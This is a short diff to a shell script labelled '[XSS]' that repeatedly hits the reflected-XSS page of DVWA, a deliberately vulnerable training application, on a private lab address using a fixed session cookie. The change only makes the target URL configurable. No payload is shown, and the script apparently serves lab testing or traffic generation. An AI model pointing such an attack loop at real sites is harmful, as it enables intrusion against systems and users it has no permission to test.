@@ -1,7 +1,7 @@
 #!/bin/sh
 echo "[XSS] Starting..."
 COOKIE="PHPSESSID=9c05efdf8aa95ac580a1abccb31893f7; security=low"
-TARGET="http://172.20.0.10/dvwa/vulnerabilities/xss_r/?name="
+TARGET="${TARGET_HOST:-http://172.20.0.10/dvwa/vulnerabilities/xss_r/?name=}"
 END=$(($(date +%s) + 1200))
 
 while [ $(date +%s) -lt $END ]; do
